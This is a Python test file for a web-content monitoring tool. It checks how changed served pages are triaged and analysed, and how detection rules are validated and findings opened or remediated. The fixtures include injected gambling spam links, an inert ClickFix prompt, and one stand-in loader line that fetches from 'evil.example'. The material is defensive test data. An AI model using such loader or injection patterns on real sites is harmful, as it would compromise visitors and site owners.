"""Triage and Analysis of served-content changes (A10) and the Served content column of the A06
Playbooks: each distinct Content fingerprint per page and user agent is triaged once, with no
tools; a flagged change is analysed automatically, from its stored bytes only, within the caps.
Security hardening and Unrelated let the Operator accept the new fingerprint as the Baseline,
Insufficient context goes to the Review queue, and a code-vulnerability Verdict is refused. A
Malicious change opens a served_content Finding with a static Proof, a Detection rule validated
against the stored bytes and a cleanup report, and no Remediation PR; a later check that matches
the Baseline again remediates it. An exposed Upstream Malicious change's validated rule is swept
over the Application's stored served content.

The site is test_served_content's in-memory shop (judol links on .test hosts, an inert ClickFix
prompt) and every agent reply comes from FixtureBroker. No test reaches a real host."""

import hashlib
import json
from datetime import timedelta

import pytest
from sqlalchemy import func, select, update

from conftest import application, connection
from numen import domain
from numen.models import Action, Analysis, Artifact, Finding, Job, Notification, RemediationPR, ServedFetch, Transcript, now, utc
from numen.schemas import SERVED_CONTENT_VERDICTS
from numen.worker import run_once
from numen.workflows import TRIAGE_SECONDS, VERDICT_REVIEW, Workflows
from test_analysis import started
from test_artifacts import APPROVAL
from test_detection_rules import DRAFTS, SHIPPED, seeded, validated, yara
from test_served_content import SHOP, baselined, changes, check, pages, served_broker, shop_site
from test_served_fingerprints import CLICKFIX_BODY, CLICKFIX_HEAD, JUDOL, rendered, scripts
from test_triage import reply

FLAGGED = {"decision": "security_candidate", "title": "Gambling links served to Googlebot only",
           "reason": "The Googlebot fetch gained links to a host the Baseline never linked"}


def assessment(verdict):
    """A served-content Analysis result with `verdict`."""
    malicious = {"indicators": {"files": [], "hosts": ["slot-gacor.test"], "urls": [], "commands": []},
                 "reachable_secrets": []} if verdict == "Malicious change" else {}
    return {**malicious, "verdict": verdict, "confidence": "high", "title": "Hidden gambling links",
            "summary": "The Googlebot page gained a hidden block of links",
            "evidence": [{"path": "source/changed/googlebot/page.html"}], "open_questions": []}


def agents(analysis=None, triage=FLAGGED):
    """The broker's answer to each agent call: the Triage reply, and the Analysis result with its report."""
    def answer(call):
        if call["profile"]["operation"] == "commit_triage":
            return triage if "reply" in triage else reply(triage), {}
        return analysis, {"report.md": b"# Hidden gambling links"}
    return answer


def judol(system, mode="pi"):
    """An Asset whose homepage has its Baseline, Triage `mode`, and now serves judol links to
    Googlebot only. (Asset id, site)"""
    app, client, _ = system
    connection(app)
    site = shop_site(rendered(1))
    ident, _ = baselined(system, site)
    assert client.patch(f"/api/applications/{ident}", json={"config": {"triage_mode": mode}}).status_code == 200
    site.update(shop_site(rendered(2), rendered(3, extra_body=JUDOL)))
    return ident, site


def jobs(app, kind=None):
    with app.state.factory() as db:
        query = select(Job).order_by(Job.created_at)
        return list(db.scalars(query.where(Job.kind == kind) if kind else query))


def googlebot(client, ident):
    return pages(client, ident)[0]["user_agents"][1]


def accept(client, ident, fetch):
    home = pages(client, ident)[0]["id"]
    return client.post(f"/api/applications/{ident}/watched-pages/{home}/baselines", json={"fetch_id": fetch["id"]})


def due(app):
    with app.state.factory.begin() as db:
        db.execute(update(Job).where(Job.status == "queued").values(not_before=now() - timedelta(seconds=1)))


def test_ten_checks_of_an_unchanged_page_after_an_unrelated_verdict_start_no_new_triage(system):
    """AC-A10: ten checks of an unchanged page after an Unrelated Verdict start no new Triage run."""
    app, client, _ = system
    ident, site = judol(system)
    broker = served_broker(site, agents(assessment("Unrelated")))
    check(system, broker, ident)
    for n in range(10):  # the judol page again, its tokens rotated
        site.update(shop_site(rendered(10 + 2 * n), rendered(11 + 2 * n, extra_body=JUDOL)))
        assert check(system, broker, ident)["result"]["changed"] == 1
    assert [len(jobs(app, kind)) for kind in ("served_check", "served_triage", "served_analysis")] == [12, 1, 1]
    assert [call["profile"]["operation"] for call in broker.calls if call["kind"] == "agent"] == [
        "commit_triage", "commit_analysis"]
    (change,) = changes(app)
    assert (change.user_agent, change.triage_status, change.verdict, change.review_decision) == (
        "googlebot", "completed", "Unrelated", "dismissed")

    # After the Unrelated Verdict the Operator accepts the new fingerprint; the next check matches it.
    latest = googlebot(client, ident)
    assert (latest["state"], latest["accept_allowed"], latest["change"]["verdict"]) == ("changed", True, "Unrelated")
    accepted = accept(client, ident, latest["latest"])
    assert accepted.status_code == 200, accepted.text
    assert accepted.json()["user_agents"][1]["baseline"]["fingerprint"] == change.fingerprint
    with app.state.factory() as db:
        action = db.scalars(select(Action).where(Action.data["action"].as_string() == "baseline_accepted")
                            .order_by(Action.created_at.desc())).first()
        assert action.data["previous"]["fetch_id"] == change.baseline_fetch_id
    check(system, broker, ident)
    assert [a["state"] for a in pages(client, ident)[0]["user_agents"]] == ["matches", "matches"]
    assert len(jobs(app, "served_triage")) == 1


def test_each_distinct_fingerprint_is_triaged_at_most_once(system):
    """A10: each distinct fingerprint, per page and user agent, is triaged at most once."""
    app, client, _ = system
    ident, site = judol(system)
    broker = served_broker(site, agents(triage={"decision": "unrelated", "title": "Copy edit", "reason": "Text only"}))
    baseline, flagged = shop_site(rendered(4)), dict(site)
    for served in (flagged, baseline, flagged, baseline, flagged):  # B, A, B, A, B
        site.update(served)
        check(system, broker, ident)
    (change,) = changes(app)
    (triage,) = jobs(app, "served_triage")
    assert (triage.input, change.triage_status, change.review_decision) == (
        {"served_change_id": change.id}, "completed", "dismissed")
    assert change.triage_result["fingerprint"] == change.fingerprint
    assert jobs(app, "served_analysis") == []  # Triage found nothing to analyse

    # The same fingerprint served to the browser is that user agent's own change, triaged separately.
    site.update(shop_site(rendered(5, extra_body=JUDOL)))
    check(system, broker, ident)
    browser = next(c for c in changes(app) if c.user_agent == "browser")
    assert browser.fingerprint == change.fingerprint
    assert [job.input["served_change_id"] for job in jobs(app, "served_triage")] == [change.id, browser.id]
    with app.state.factory() as db:
        transcripts = db.scalars(select(Transcript).where(Transcript.kind == "triage")).all()
        assert sorted(t.subject_id for t in transcripts) == sorted([change.id, browser.id])


def test_analysis_reads_only_the_stored_bytes_of_both_user_agents(system):
    """A10: a changed fingerprint goes through Triage and Analysis, which read only the stored
    bytes: neither job fetches again, and Analysis runs with no target policy."""
    app, client, config = system
    ident, site = judol(system)
    broker = served_broker(site, agents(assessment("Security hardening")))
    broker.requested.clear()
    check(system, broker, ident)
    assert [call["kind"] for call in broker.calls] == ["probe", "agent", "agent"]
    assert len(broker.requested) == 6  # the one check's page and two scripts, as each user agent
    triage, analysis = broker.calls[1:]
    (change,) = changes(app)
    assert (triage["profile"]["operation"], triage["files"], triage["policy"]) == ("commit_triage", {}, None)
    assert triage["limits"] == {"timeout_seconds": TRIAGE_SECONDS} and "no tools" in triage["prompt"]
    assert set(triage["schema"]["properties"]) == {"decision", "title", "reason"}
    facts = json.loads(triage["prompt"].rsplit("\n\nFacts:\n", 1)[1])
    with app.state.factory() as db:
        baseline = db.get(ServedFetch, change.baseline_fetch_id)
    assert facts == {"page_url": SHOP, "user_agent": "googlebot", "fingerprint": change.fingerprint,
                     "baseline_fingerprint": baseline.fingerprint,
                     "diff": json.dumps(change.diff, indent=1, sort_keys=True, ensure_ascii=False),
                     "diff_complete": True}
    assert "slot-gacor.test" in facts["diff"]

    assert (analysis["profile"]["operation"], analysis["policy"], analysis["limits"]) == (
        "commit_analysis", None, {"timeout_seconds": 1800})
    schema = analysis["schema"]
    assert schema["properties"]["verdict"]["enum"] == list(SERVED_CONTENT_VERDICTS)
    assert not {"vulnerable_ref", "addresses", "before_after"} & schema["properties"].keys()
    with app.state.factory() as db:
        fetches = db.scalars(select(ServedFetch).where(ServedFetch.job_id == db.get(ServedFetch, change.fetch_id).job_id))
        workflows = Workflows(config, None, None, None)
        stored = {}
        for fetch in fetches:
            stored.update(workflows.served_files(db, fetch, f"source/changed/{fetch.user_agent}/"))
        home = db.get(ServedFetch, change.fetch_id).page_id
        for agent in ("browser", "googlebot"):
            accepted = db.scalar(select(ServedFetch).where(ServedFetch.page_id == home, ServedFetch.user_agent == agent)
                                 .order_by(ServedFetch.created_at).limit(1))
            stored.update(workflows.served_files(db, accepted, f"source/baseline/{agent}/"))
    listing = json.loads(analysis["files"].pop("served-content.json"))
    assert analysis["files"] == stored and len(stored) == 12
    assert (listing["page_url"], listing["user_agent"], listing["diff"]) == (SHOP, "googlebot", change.diff)
    assert listing["files"]["source/changed/googlebot/page.html"]["url"] == SHOP
    assert set(listing["files"]) == set(stored)
    assert "fetched and never run" in analysis["prompt"]

    # Its Analysis is stored, exportable, and the job names the page and user agent.
    with app.state.factory() as db:
        (row,) = db.scalars(select(Analysis).where(Analysis.subject_id == change.id))
        assert (row.kind, row.result["verdict"]) == ("served_analysis", "Security hardening")
        assert {a.path for a in db.scalars(select(Artifact).where(Artifact.resource_id == row.id))} >= {"report.md"}
    assert client.get(f"/api/analyses/{row.id}/download").status_code == 200
    (job,) = jobs(app, "served_analysis")
    subject = client.get(f"/api/jobs/{job.id}").json()["subject"]
    assert subject == {"type": "served", "label": f"{SHOP} · Googlebot", "ref": change.fingerprint[:12],
                       "link": f"/applications/{ident}?tab=served"}
    assert googlebot(client, ident)["change"]["analysis_state"] == {"status": "completed", "analysis_id": row.id}


@pytest.mark.parametrize("verdict", ["Security hardening", "Unrelated", "Insufficient context"])
def test_each_served_content_verdict_runs_only_its_cell(system, verdict):
    """A06 Served content column: Security hardening is recorded and Unrelated stops, and the
    Operator may accept the new fingerprint as the Baseline; Insufficient context goes to the
    Review queue. AC-A06: only the cell's steps run; AC-A12: none of them sends an Alert."""
    app, client, _ = system
    ident, site = judol(system)
    check(system, served_broker(site, agents(assessment(verdict))), ident)
    (change,) = changes(app)
    assert (change.verdict, change.review_decision) == (verdict, VERDICT_REVIEW[verdict])
    assert {job.kind for job in jobs(app)} == {"served_check", "served_triage", "served_analysis"}
    with app.state.factory() as db:
        assert db.scalar(select(func.count()).select_from(Finding)) == 0
        assert db.scalar(select(func.count()).select_from(Notification)) == 0
    latest = googlebot(client, ident)
    response = accept(client, ident, latest["latest"])
    dashboard = client.get("/api/dashboard").json()
    if verdict != "Insufficient context":
        assert latest["accept_allowed"] is True
        assert response.status_code == 200, response.text
        assert dashboard["review_queue"] == []
        return
    assert latest["accept_allowed"] is False
    assert (response.status_code, response.json()["code"]) == (409, "baseline_not_allowed")
    assert dashboard["review_queue_count"] == 1
    assert dashboard["review_queue"] == [{
        "id": change.id, "title": f"{SHOP} · Googlebot", "revision": change.fingerprint[:12],
        "application_id": ident, "committed_at": dashboard["review_queue"][0]["committed_at"],
        "link": f"/applications/{ident}?tab=served"}]
    assert dashboard["review_queue"][0]["committed_at"]
    # The Operator's decision takes it out of the queue, and is recorded.
    reviewed = client.post(f"/api/served-changes/{change.id}/review", json={"decision": "dismissed"})
    assert reviewed.status_code == 200 and reviewed.json()["review_decision"] == "dismissed"
    assert client.get("/api/dashboard").json()["review_queue"] == []
    with app.state.factory() as db:
        (action,) = db.scalars(select(Action).where(Action.resource_type == "served_change"))
        assert (action.resource_id, action.data) == (change.id, {"action": "review", "decision": "dismissed"})


@pytest.mark.parametrize("verdict", ["Vulnerability fix", "Vulnerability introduced"])
def test_a_served_content_analysis_that_returns_a_code_vulnerability_verdict_fails(system, verdict):
    """AC-A04 and the A06 Served content column's 'Not allowed' cells."""
    app, client, _ = system
    ident, site = judol(system)
    check(system, served_broker(site, agents(assessment(verdict))), ident)
    (job,) = jobs(app, "served_analysis")
    assert (job.status, job.error["code"]) == ("failed", "verdict_not_allowed")
    (change,) = changes(app)
    assert (change.analysis_state["status"], change.analysis_state["job_id"], change.verdict) == ("failed", job.id, None)
    assert change.review_decision == "candidate"  # Triage's flag; the Verdict decides nothing
    with app.state.factory() as db:
        assert db.scalar(select(func.count()).select_from(Analysis)) == 0
        assert db.scalar(select(func.count()).select_from(Finding)) == 0
    assert (accept(client, ident, googlebot(client, ident)["latest"]).status_code) == 409
    retried = client.post(f"/api/jobs/{job.id}/retry")
    assert retried.status_code == 202, retried.text
    assert googlebot(client, ident)["change"]["analysis_state"] == {"status": "queued", "job_id": retried.json()["job_id"]}


def test_triage_off_records_the_change_and_manual_analysis_still_works(system):
    """A02: with Triage off the change is recorded, untriaged, and the Operator can analyse it."""
    app, client, config = system
    ident, site = judol(system, mode="disabled")
    broker = served_broker(site, agents(assessment("Unrelated")))
    check(system, broker, ident)
    (change,) = changes(app)
    assert (change.triage_status, change.analysis_state, jobs(app, "served_triage")) == ("disabled", None, [])
    latest = googlebot(client, ident)
    assert latest["accept_allowed"] is False  # no Verdict yet
    assert accept(client, ident, latest["latest"]).json()["code"] == "baseline_not_allowed"

    queued = client.post(f"/api/served-changes/{change.id}/analyses", json={})
    assert queued.status_code == 202, queued.text
    assert googlebot(client, ident)["change"]["analysis_state"] == {"status": "queued", "job_id": queued.json()["job_id"]}
    (job,) = jobs(app, "served_analysis")
    assert "automatic" not in job.input and job.profile["agent"] == "pi"
    while run_once(config, app.state.factory, broker):
        pass
    assert googlebot(client, ident)["change"]["verdict"] == "Unrelated"
    assert accept(client, ident, latest["latest"]).status_code == 200

    # Jev Triage reads commits only: a served-content change is blocked, with that reason.
    assert client.patch(f"/api/applications/{ident}", json={"config": {"triage_mode": "jev"}}).status_code == 200
    site.update(shop_site(rendered(6, extra_head=CLICKFIX_HEAD, extra_body=CLICKFIX_BODY)))
    check(system, broker, ident)
    blocked = [c for c in changes(app) if c.id != change.id]
    assert {c.triage_status for c in blocked} == {"blocked"} and len(blocked) == 2
    assert {c.triage_result["error"] for c in blocked} == {"jev_triage_unsupported"}
    assert jobs(app, "served_triage") == []


def test_a_failed_served_triage_is_retried_never_read_as_unrelated(system):
    """AC-A03: a reply that fails the schema is recorded as failed and retried."""
    app, client, config = system
    ident, site = judol(system)
    invalid = {"reply": 'Nothing to see. {"decision": "unrelated", "title": "Copy"}'}
    check(system, served_broker(site, agents(triage=invalid)), ident)
    first = jobs(app, "served_triage")[0]
    (change,) = changes(app)
    assert (first.status, first.error["code"]) == ("failed", "invalid_agent_output")
    assert (change.triage_status, change.review_decision, change.analysis_state) == ("failed", "pending", None)
    assert (change.triage_result["error"], change.triage_result["attempt"]) == ("invalid_agent_output", 1)
    with app.state.factory() as db:
        retry = db.get(Job, change.triage_result["retry_job_id"])
        assert (retry.kind, retry.status, retry.input["attempt"], retry.profile) == (
            "served_triage", "queued", 2, first.profile)
        (transcript,) = db.scalars(select(Transcript).where(Transcript.subject_id == change.id))
        assert transcript.data["status"] == "failed"
    due(app)
    broker = served_broker(site, agents(assessment("Unrelated")))
    while run_once(config, app.state.factory, broker):
        pass
    (change,) = changes(app)
    assert (change.triage_status, change.verdict) == ("completed", "Unrelated")


def test_automatic_served_analysis_waits_at_a_cap_and_manual_analysis_still_works(system):
    """AC-A04: served-content Analyses count against the same caps; at a cap the automatic one
    waits and starts once the caps reset, oldest first, and manual Analysis still works."""
    app, client, config = system
    ident, site = judol(system)
    started(app, ident, domain.ANALYSIS_CAPS["application"])
    broker = served_broker(site, agents(assessment("Unrelated")))
    check(system, broker, ident)
    (change,) = changes(app)
    assert (change.analysis_state["status"], change.analysis_state["cap"]) == ("waiting_for_cap", "application")
    assert jobs(app, "served_analysis") == []

    queued = client.post(f"/api/served-changes/{change.id}/analyses", json={})
    assert queued.status_code == 202, queued.text
    while run_once(config, app.state.factory, broker):
        pass
    assert googlebot(client, ident)["change"]["analysis_state"]["status"] == "completed"

    # The browser's ClickFix change waits too, and starts when the caps reset at 00:00 UTC.
    site.update(shop_site(rendered(7, extra_head=CLICKFIX_HEAD, extra_body=CLICKFIX_BODY), rendered(8, extra_body=JUDOL)))
    check(system, broker, ident)
    waiting = next(c for c in changes(app) if c.user_agent == "browser")
    assert waiting.analysis_state["status"] == "waiting_for_cap"
    with app.state.factory.begin() as db:
        for job in db.scalars(select(Job)):
            job.created_at -= timedelta(days=1)
    with app.state.factory.begin() as db:
        domain.schedule(db)
    automatic = jobs(app, "served_analysis")[-1]
    assert (automatic.idempotency_key, automatic.input) == (
        f"served-analysis:{waiting.id}", {"served_change_id": waiting.id, "automatic": True, "shared": False})
    assert pages(client, ident)[0]["user_agents"][0]["change"]["analysis_state"] == {
        "status": "queued", "job_id": automatic.id}


# The Served content column's Malicious change (A06): a static Proof, a Detection rule and a
# cleanup report, no Remediation PR. yara is test_detection_rules' simulated runner: a file matches
# when it holds every string of the rule.
JUDOL_RULE = b'rule judol_links { strings: $a = "slot-gacor.test/daftar" condition: $a }'
BROKEN_RULE = b'rule judol_links { strings: $a = "slot-gacor.test/daftar" }'  # no condition: it never compiles
SECRETS = ["The shop's admin session cookie", " "]


def malicious(rule=JUDOL_RULE, **indicators):
    """The broker's answers to a served-content Malicious change: Triage flags it, Analysis finds
    the judol links and drafts `rule`, and yara answers each detection_rule run."""
    result = {**assessment("Malicious change"), "reachable_secrets": SECRETS}
    result["indicators"] = {**result["indicators"], **indicators}

    def answer(call):
        if call["kind"] == "detection_rule":
            return yara(call)
        if call["profile"]["operation"] == "commit_triage":
            return reply(FLAGGED), {}
        return result, {"report.md": b"# Hidden gambling links", "detection-rule.yar": rule}
    return answer


def served_findings(client):
    return [client.get(f"/api/findings/{row['id']}").json() for row in client.get("/api/findings").json()["items"]]


def test_a_malicious_change_in_served_content_gets_a_static_proof_detection_rule_and_cleanup_report_and_no_remediation_pr(system):
    """A06 Served content: Malicious change gets a static Proof, Detection rule and cleanup report,
    and no Remediation PR; A11: it opens a served_content Finding, whose one Alert names the
    Watched page and holds no agent text (AC-A12)."""
    app, client, _ = system
    ident, site = judol(system)
    page = "source/changed/googlebot/page.html"
    broker = served_broker(site, malicious(
        files=[page, "source/changed/browser/scripts/00.js", "source/baseline/googlebot/page.html", "page.html"],
        hosts=["slot-gacor.test", "cdn.shop.test", "c2.test", ""],
        urls=["https://slot-gacor.test/daftar"], commands=["echo asset-monitor-fixture"]))
    check(system, broker, ident)
    (change,) = changes(app)
    (finding,) = served_findings(client)
    with app.state.factory() as db:
        (analysis,) = db.scalars(select(Analysis).where(Analysis.subject_id == change.id))
        fetch = db.get(ServedFetch, change.fetch_id)
        changed = Workflows(app.state.config, None, None, None).served_files(db, fetch)
    assert (finding["source"], finding["source_ref"], finding["title"], finding["malicious_change"]) == (
        "served_content", SHOP, "Hidden gambling links", True)
    assert finding["subject_id"] == change.id
    assert googlebot(client, ident)["change"]["finding_id"] == finding["id"]  # the Served content tab links it
    opened = finding["events"][0]
    assert opened["cause"] | {"at": None} == {"by": "verdict", "verdict": "Malicious change", "confidence": "high",
                                              "analysis_id": analysis.id, "served_change_id": change.id, "at": None}
    assert [(row["step"], row["status"]) for row in finding["playbook"]] == [
        ("static_proof", "validated"), ("detection_rule", "validated"), ("cleanup_report", "ready")]
    # Application code checked the indicators against the stored bytes and hashed the file itself.
    assert finding["static_proof"]["indicators"] == {
        "files": [{"path": page, "sha256": hashlib.sha256(changed["page.html"]).hexdigest()}],
        "hosts": ["slot-gacor.test"], "urls": ["https://slot-gacor.test/daftar"], "commands": [],
        "rejected": [
            {"kind": "file", "value": "source/changed/browser/scripts/00.js", "reason": "The Baseline fetch served these bytes too"},
            {"kind": "file", "value": "source/baseline/googlebot/page.html", "reason": "Not a file of the changed fetch"},
            {"kind": "file", "value": "page.html", "reason": "Not a file of the changed fetch"},
            {"kind": "host", "value": "cdn.shop.test", "reason": "Also in the Baseline fetch's bytes"},
            {"kind": "host", "value": "c2.test", "reason": "Not in the changed fetch's bytes"},
            {"kind": "host", "value": "", "reason": "Not in the changed fetch's bytes"},
            {"kind": "command", "value": "echo asset-monitor-fixture", "reason": "Not in the changed fetch's bytes"},
        ],
    }
    assert finding["cleanup_report"] == {
        "analysis_id": analysis.id, "page_url": SHOP, "user_agent": "googlebot", "fetch_ids": [change.fetch_id],
        "first_seen": finding["cleanup_report"]["first_seen"], "secrets": SECRETS[:1]}
    assert finding["cleanup_report"]["first_seen"].startswith(fetch.created_at.isoformat()[:19])
    assert {a["path"] for a in finding["artifacts"]} == {"report.md", "indicators.json", "detection-rule.yar",
                                                         "manifest.json"}
    assert (finding["status"], finding["cause"]["by"]) == ("confirmed", "detection_rule")

    # No Remediation PR and no Lab: a Malicious change never runs.
    assert (finding["remediation_prs"], finding["remediation_actions"]) == ([], [])
    lab = client.post(f"/api/findings/{finding['id']}/lab-runs", json=APPROVAL)
    assert (lab.status_code, lab.json()["code"]) == (409, "lab_not_allowed")
    assert {job.kind for job in jobs(app)} == {"served_check", "served_triage", "served_analysis", "detection_rule",
                                               "notification"}
    with app.state.factory() as db:
        assert db.scalar(select(func.count()).select_from(RemediationPR)) == 0
        (alert,) = db.scalars(select(Notification))
    assert alert.data == {"application": "Toko Batik Sari", "account": None, "source": SHOP,
                          "verdict": "Malicious change · high confidence", "link": f"/findings/{finding['id']}"}
    assert (accept(client, ident, googlebot(client, ident)["latest"]).json()["code"]) == "baseline_not_allowed"

    # A repeat Analysis redrafts the static Proof on the same Finding: it never opens a duplicate.
    assert client.post(f"/api/served-changes/{change.id}/analyses", json={}).status_code == 202
    while run_once(app.state.config, app.state.factory, broker):
        pass
    (again,) = served_findings(client)
    assert again["id"] == finding["id"] and again["artifact_revision"] != finding["artifact_revision"]
    assert again["static_proof"]["status"] == "validated"
    with app.state.factory() as db:
        assert db.scalar(select(func.count()).select_from(Notification)) == 1


SERVED_CHECKS = [
    ("passed", JUDOL_RULE, None, None),
    ("changed", b'rule other { strings: $a = "c2.test" condition: $a }', None,
     "The Detection rule matches none of the changed fetch's stored bytes"),
    ("parent", JUDOL_RULE, "parent", "The Detection rule also matches the previous fetch's stored bytes"),
    ("baseline", JUDOL_RULE, "baseline", "The Detection rule also matches the Baseline fetch's stored bytes"),
    ("skipped", JUDOL_RULE, None, None),
]


@pytest.mark.parametrize("case,rule,comment,message", SERVED_CHECKS, ids=[row[0] for row in SERVED_CHECKS])
def test_the_served_content_detection_rule_must_match_the_changed_fetch_and_not_the_baseline_or_previous(
        system, case, rule, comment, message):
    """A07 Served content: the rule must match the changed fetch's stored bytes and neither the
    Baseline fetch's nor the previous fetch's. A pass confirms the Finding; a failure leaves the
    artifacts Draft, names the failed check and keeps the Finding Open. An HTML comment holding
    the rule's string leaves the fingerprint as it is, so the Baseline or the previous fetch can
    hold it unnoticed."""
    app, client, _ = system
    connection(app)
    hidden = "\n<!-- slot-gacor.test/daftar -->"
    site = shop_site(rendered(1, extra_body=hidden if comment == "baseline" else ""))
    ident, broker = baselined(system, site)
    assert client.patch(f"/api/applications/{ident}", json={"config": {"triage_mode": "pi"}}).status_code == 200
    if case != "skipped":  # a check that matches the Baseline: the change's previous fetch
        site.update(shop_site(rendered(2, extra_body=hidden if comment == "parent" else "")))
        assert check(system, broker, ident)["result"]["matches"] == 2
    site.update(shop_site(rendered(3), rendered(4, extra_body=JUDOL)))
    broker = served_broker(site, malicious(rule))
    check(system, broker, ident)
    # AC-A07: no job ever executes a Malicious change payload: the agent reads the stored bytes and
    # yara scans them.
    assert [call["kind"] for call in broker.calls] == ["probe", "agent", "agent", "detection_rule"]
    scan = broker.calls[-1]
    assert (scan["profile"], scan["policy"], scan["prompt"]) == (None, None, "")
    (change,) = changes(app)
    with app.state.factory() as db:
        workflows = Workflows(app.state.config, None, None, None)
        trees = {name: workflows.served_files(db, db.get(ServedFetch, ident), name + "/") for name, ident in (
            ("changed", change.fetch_id), ("parent", change.previous_fetch_id), ("baseline", change.baseline_fetch_id))}
    assert (change.previous_fetch_id == change.baseline_fetch_id) is (case == "skipped")
    if case == "skipped":
        trees.pop("baseline")
    assert scan["files"] == {"rule.yar": rule, **trees["changed"], **trees["parent"], **trees.get("baseline", {})}

    (finding,) = served_findings(client)
    proof = finding["static_proof"]
    if message is None:
        assert [(c["name"], c["status"]) for c in proof["checks"]] == [
            ("rule", "passed"), ("changed", "passed"), ("parent", "passed"),
            ("baseline", "skipped" if case == "skipped" else "passed")]
        assert proof["checks"][1] == {"name": "changed", "status": "passed", "files": ["page.html"], "count": 1,
                                      "message": "The Detection rule matches the changed fetch's stored bytes"}
        if case == "skipped":
            assert proof["checks"][3] == {"name": "baseline", "status": "skipped",
                                          "message": "The previous fetch is the Baseline fetch"}
        assert (proof["status"], finding["artifact_state"]["status"]) == ("validated", "complete")
        cause = {k: finding["cause"][k] for k in ("by", "artifact_revision", "job_id")}
        assert (finding["status"], cause) == ("confirmed", {
            "by": "detection_rule", "artifact_revision": finding["artifact_revision"], "job_id": proof["job_id"]})
        return
    failed = {c["name"]: c["message"] for c in proof["checks"] if c["status"] == "failed"}
    assert (proof["status"], failed) == ("failed", {case: message})
    assert finding["artifact_state"]["status"] == "draft" and message in finding["artifact_state"]["limitations"]
    assert (finding["status"], finding["cause"]["by"]) == ("open", "verdict")
    assert [e["action"] for e in finding["events"]] == ["opened"]


def test_a_later_check_matching_the_baseline_again_remediates_the_finding(system):
    """A10, A11: a served-content Finding becomes Remediated when a later check matches the
    Baseline again for its user agent, or when the Operator marks it; AC-A11: a Remediated Finding
    records what remediated it. The rule never compiles here, so each Finding stays Open."""
    app, client, _ = system
    ident, site = judol(system)
    broker = served_broker(site, malicious(BROKEN_RULE))
    check(system, broker, ident)  # Googlebot: judol (F1)
    site.update(shop_site(rendered(5, extra_head=CLICKFIX_HEAD, extra_body=CLICKFIX_BODY),
                          rendered(6, extra_head=CLICKFIX_HEAD, extra_body=JUDOL + CLICKFIX_BODY)))
    check(system, broker, ident)  # browser: ClickFix (F2); Googlebot: judol and ClickFix (F3)
    first, *later = changes(app)
    findings = {f["subject_id"]: f for f in served_findings(client)}
    judol_only = findings[first.id]
    clickfix, both = (findings[next(c.id for c in later if c.user_agent == agent)] for agent in ("browser", "googlebot"))
    assert {f["status"] for f in findings.values()} == {"open"} and len(findings) == 3

    def transition(finding, state):
        response = client.post(f"/api/findings/{finding['id']}/transitions", json={"state": state, "reason": "Checked by hand"})
        assert response.status_code == 200, response.text
        return response.json()

    assert transition(clickfix, "dismissed")["status"] == "dismissed"
    marked = transition(both, "remediated")
    assert (marked["status"], marked["cause"]["by"], marked["cause"]["reason"]) == ("remediated", "operator", "Checked by hand")

    # The browser matches its Baseline again: the Googlebot Finding stays Open, the Dismissed one Dismissed.
    site.update(shop_site(rendered(7), rendered(8, extra_body=JUDOL)))
    assert check(system, broker, ident)["result"]["matches"] == 1
    assert client.get(f"/api/findings/{judol_only['id']}").json()["status"] == "open"
    assert client.get(f"/api/findings/{clickfix['id']}").json()["status"] == "dismissed"

    # Googlebot matches its Baseline again: its Open Finding is Remediated, with what remediated it.
    site.update(shop_site(rendered(9)))
    assert check(system, broker, ident)["result"]["matches"] == 2
    latest = googlebot(client, ident)["latest"]
    remediated = client.get(f"/api/findings/{judol_only['id']}").json()
    assert remediated["status"] == "remediated"
    assert remediated["cause"] | {"at": None} == {"by": "baseline_match", "fetch_id": latest["id"],
                                                  "page_id": pages(client, ident)[0]["id"], "user_agent": "googlebot",
                                                  "at": None}
    (moved,) = [e for e in remediated["events"] if e["action"] == "transition"]
    assert (moved["from"], moved["to"], moved["cause"]) == ("open", "remediated", remediated["cause"])
    assert client.get(f"/api/findings/{clickfix['id']}").json()["status"] == "dismissed"
    kept = client.get(f"/api/findings/{both['id']}").json()
    assert (kept["status"], kept["cause"]["by"]) == ("remediated", "operator")


# The Upstream column's Malicious change (A06): its validated Detection rule is swept over the
# Asset's stored served content, with no new fetching. The Asset's CDN script carries the
# postinstall loader's strings.
LOADER = 'fetch("https://evil.example/x").then(r => r.text()); /* payload-ran */'


def upstream_finding(system, tmp_path, served_site=None):
    """An Upstream Application on SHOP, checked once on `served_site` if given, whose Upstream
    repository gets test_detection_rules' postinstall Malicious change: (the Finding, the broker)."""
    app, client, _ = system
    connection(app)
    monitored = application(client, asset_url=SHOP, asset_name="Toko Batik Sari")
    if served_site:
        check(system, served_broker(served_site), monitored["id"])
    ident = seeded(system, tmp_path, monitored)
    runs = served_broker(served_site or {}, lambda call: (SHIPPED, DRAFTS) if call["kind"] == "agent" else yara(call))
    return validated(system, ident, runs), runs


def test_an_upstream_malicious_change_sweeps_the_stored_served_content(system, tmp_path):
    app, client, _ = system
    site = {**shop_site(rendered(1)), (None, "https://cdn.shop.test/vendor.js"): (200, {"content-type": "text/javascript"}, LOADER)}
    finding, runs = upstream_finding(system, tmp_path, site)
    assert finding["playbook"][-1] == {"step": "served_content_sweep", "status": "matched"}
    # The sweep is one detection_rule run over the stored bytes: no probe, nothing fetched again.
    assert [call["kind"] for call in runs.calls] == ["agent", "detection_rule", "detection_rule"]
    sweep = runs.calls[2]
    assert (sweep["profile"], sweep["policy"], sweep["prompt"]) == (None, None, "")
    stored = {hashlib.sha256(data).hexdigest(): data for data in (
        rendered(1).encode(), LOADER.encode(), list(scripts().values())[0].encode())}
    assert sweep["files"] == {"rule.yar": DRAFTS["detection-rule.yar"],
                              **{f"changed/{digest}": data for digest, data in stored.items()}}
    with app.state.factory() as db:
        fetches = {row.user_agent: row for row in db.scalars(select(ServedFetch))}
    loader = hashlib.sha256(LOADER.encode()).hexdigest()
    swept = finding["served_content_sweep"]
    assert sorted(swept["matches"], key=lambda m: m["user_agent"]) == [
        {"page_id": fetches[agent].page_id, "page_url": SHOP, "user_agent": agent, "fetch_id": fetches[agent].id,
         "url": "https://cdn.shop.test/vendor.js", "sha256": loader,
         "fetched_at": utc(fetches[agent].created_at).isoformat()} for agent in ("browser", "googlebot")]
    (job,) = jobs(app, "served_content_sweep")
    assert {k: swept[k] for k in ("artifact_revision", "job_id", "status", "count", "truncated")} == {
        "artifact_revision": finding["artifact_revision"], "job_id": job.id, "status": "matched", "count": 2,
        "truncated": False}
    assert job.idempotency_key == f"served-sweep:{finding['id']}:{finding['artifact_revision']}"
    (event,) = [e for e in finding["events"] if e["action"] == "served_content_swept"]
    assert (event["job_id"], event["count"]) == (job.id, 2)
    # The lifecycle is unchanged: the validated rule confirmed it, the sweep moves nothing.
